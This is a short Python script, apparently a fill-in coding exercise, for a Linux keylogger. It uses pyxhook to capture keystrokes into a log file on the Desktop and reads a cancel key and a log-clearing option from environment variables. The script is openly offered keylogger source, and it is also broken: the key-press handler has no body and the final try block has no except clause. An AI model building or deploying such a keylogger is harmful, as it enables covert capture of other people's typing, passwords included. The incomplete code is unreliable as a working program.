# Python code for keylogger
# to be used in linux
import os
import pyxhook

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_file = os.environ.get(
	'pylogger_file',
	os.path.expanduser('~/Desktop/file.log')
)
# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
	os.environ.get(
		'pylogger_cancel',
		'`'
	)[0]
)

# Allow clearing the log file on start, if pylogger_clean is defined.
if os.environ.get('pylogger_clean', None) is not None:
	try:
		os.remove(log_file)
	except EnvironmentError:
	# File does not exist, or no permissions.
		pass

def OnKeyPress(event):

#creating key pressing event and saving it into log file



# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook
new_hook.HookKeyboard()

#create a try and catch statement to stop the program if keyboard interrupts
#and if something unexpected happens then log the output.
#try statement is written for you write the except statements


try:
	new_hook.start()		 # start the hook
